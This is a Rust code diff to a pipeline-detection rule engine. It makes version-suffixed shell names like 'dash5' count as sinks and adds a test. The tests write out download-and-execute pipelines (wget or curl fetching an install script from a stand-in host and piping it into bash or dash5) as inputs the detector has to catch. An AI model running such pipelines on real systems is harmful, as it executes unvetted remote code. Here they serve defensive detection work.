@@ -2967,7 +2967,18 @@ impl PipelineRule {
         let Some((sink_name, sink_tail)) = effective_command(sink_stage) else {
             return false;
         };
-        if !self.sinks.iter().any(|sink| sink == sink_name) {
+        // Issue #497: a versioned/distro-suffixed sink binary (`dash5`)
+        // resolves to the same interpreter `strip_version_suffix` already
+        // normalizes it to elsewhere (`is_pipeline_interpreter`,
+        // `is_shell_interpreter`) — the sink match must recognize it too.
+        // Only the runtime name is normalized; a `sinks` entry is compared
+        // literally, so an entry that itself ends in a digit (`python3`)
+        // is reachable only through the exact-match arm.
+        if !self
+            .sinks
+            .iter()
+            .any(|sink| sink == sink_name || sink == strip_version_suffix(sink_name))
+        {
             return false;
         }
         // Membership semantics (no `--` end-of-flags awareness, an
@@ -10625,6 +10636,15 @@ mod tests {
             argv(&["wget", "-O-", "http://x/install.sh"]),
             argv(&["bash"]),
         ];
+        assert!(rules.match_pipeline(&stages).is_some());
+    }
+
+    // Issue #497: a versioned/distro-suffixed sink name (`dash5`) must be
+    // recognized the same way the unversioned spelling already is.
+    #[test]
+    fn curl_pipe_versioned_dash_sink_matches() {
+        let rules = Rules::embedded().unwrap();
+        let stages = vec![argv(&["curl", "http://x/install.sh"]), argv(&["dash5"])];
         assert!(rules.match_pipeline(&stages).is_some());
     }
 
